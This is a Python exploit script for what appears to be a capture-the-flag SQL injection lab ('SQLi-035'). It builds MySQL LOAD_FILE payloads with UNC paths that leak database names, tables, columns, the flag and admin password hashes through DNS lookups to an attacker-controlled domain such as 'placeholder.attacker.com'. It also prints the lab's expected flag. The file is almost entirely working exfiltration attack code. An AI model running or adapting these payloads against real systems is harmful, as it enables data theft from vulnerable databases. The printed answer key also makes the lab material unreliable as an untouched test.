#!/usr/bin/env python3
"""
SQLi-035: MySQL OOB DNS Exfiltration Exploit
Technique: LOAD_FILE() with UNC path

Usage:
    python exploit.py --collaborator your-subdomain.burpcollaborator.net
    python exploit.py --interactsh xxx.oast.fun
"""

import requests
import argparse
import time
import urllib.parse

def create_payload(query, oob_domain):
    """Create OOB payload with proper escaping"""
    # Double escape for SQL string + URL encoding
    payload = f"1 AND LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{oob_domain}\\\\a'))"
    return payload

def send_payload(url, payload):
    """Send payload to target"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=15)
        return True
    except requests.exceptions.Timeout:
        print("[!] Request timed out (this might be normal for OOB)")
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def extract_database(url, oob_domain):
    """Extract database name"""
    print("\n[*] Extracting database name...")
    payload = create_payload("SELECT database()", oob_domain)
    send_payload(url, payload)
    print(f"    â†’ Check DNS: <database>.{oob_domain}")

def extract_tables(url, oob_domain, db_name="database()"):
    """Extract table names"""
    print(f"\n[*] Extracting tables from {db_name}...")
    for i in range(10):
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema={db_name} LIMIT {i},1"
        payload = create_payload(query, oob_domain)
        send_payload(url, payload)
        print(f"    â†’ Table {i+1}: Check DNS for lookup")
        time.sleep(0.5)
    print(f"    â†’ Check DNS: <table_name>.{oob_domain}")

def extract_columns(url, oob_domain, table_name):
    """Extract column names"""
    print(f"\n[*] Extracting columns from '{table_name}'...")
    for i in range(10):
        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}' LIMIT {i},1"
        payload = create_payload(query, oob_domain)
        send_payload(url, payload)
        print(f"    â†’ Column {i+1}: Check DNS for lookup")
        time.sleep(0.5)
    print(f"    â†’ Check DNS: <column_name>.{oob_domain}")

def extract_data(url, oob_domain, table, column, use_hex=False):
    """Extract data from specific column"""
    print(f"\n[*] Extracting data from {table}.{column}...")
    for i in range(5):
        if use_hex:
            query = f"SELECT HEX({column}) FROM {table} LIMIT {i},1"
            print(f"    â†’ Row {i+1} (HEX encoded)")
        else:
            query = f"SELECT {column} FROM {table} LIMIT {i},1"
            print(f"    â†’ Row {i+1}")
        
        payload = create_payload(query, oob_domain)
        send_payload(url, payload)
        time.sleep(0.5)
    
    if use_hex:
        print(f"\n    [!] Decode HEX: bytes.fromhex('<dns_lookup>').decode()")
    print(f"    â†’ Check DNS: <data>.{oob_domain}")

def extract_flag(url, oob_domain):
    """Extract flag from flags table"""
    print("\n" + "="*60)
    print("[*] EXTRACTING FLAG...")
    print("="*60)
    
    # Direct extraction
    print("\n[1] Direct extraction:")
    query = "SELECT value FROM flags LIMIT 0,1"
    payload = create_payload(query, oob_domain)
    send_payload(url, payload)
    print(f"    â†’ Check DNS for: FLAG{{...}}.{oob_domain}")
    
    time.sleep(1)
    
    # HEX encoded extraction
    print("\n[2] HEX encoded extraction:")
    query = "SELECT HEX(value) FROM flags LIMIT 0,1"
    payload = create_payload(query, oob_domain)
    send_payload(url, payload)
    print(f"    â†’ Decode result: bytes.fromhex('<hex>').decode()")
    
    print("\n" + "="*60)
    print("ðŸŽ‰ Expected flag: FLAG{mysql_oob_dns_unc_exfil}")
    print("="*60)

def main():
    parser = argparse.ArgumentParser(description="SQLi-035: MySQL OOB DNS Exfiltration")
    parser.add_argument("--target", default="http://localhost:5035/product", 
                        help="Target URL (default: http://localhost:5035/product)")
    parser.add_argument("--collaborator", help="Burp Collaborator subdomain")
    parser.add_argument("--interactsh", help="interactsh domain")
    parser.add_argument("--full", action="store_true", help="Run full enumeration")
    
    args = parser.parse_args()
    
    # Determine OOB domain
    if args.collaborator:
        oob_domain = args.collaborator
    elif args.interactsh:
        oob_domain = args.interactsh
    else:
        print("[!] Please specify --collaborator or --interactsh domain")
        print("[*] Example: python exploit.py --collaborator abc123.burpcollaborator.net")
        print("[*] For testing without OOB, using placeholder domain...")
        oob_domain = "placeholder.attacker.com"
    
    print("="*60)
    print("SQLi-035: MySQL OOB DNS Exfiltration Exploit")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"OOB Domain: {oob_domain}")
    print("="*60)
    print("\n[!] Make sure you're monitoring your OOB listener!")
    
    if args.full:
        # Full enumeration
        extract_database(args.target, oob_domain)
        time.sleep(1)
        extract_tables(args.target, oob_domain)
        time.sleep(1)
        extract_columns(args.target, oob_domain, "flags")
        time.sleep(1)
        extract_data(args.target, oob_domain, "flags", "value", use_hex=True)
        time.sleep(1)
        extract_data(args.target, oob_domain, "admin_users", "password", use_hex=True)
    
    # Always extract flag
    extract_flag(args.target, oob_domain)

if __name__ == "__main__":
    main()
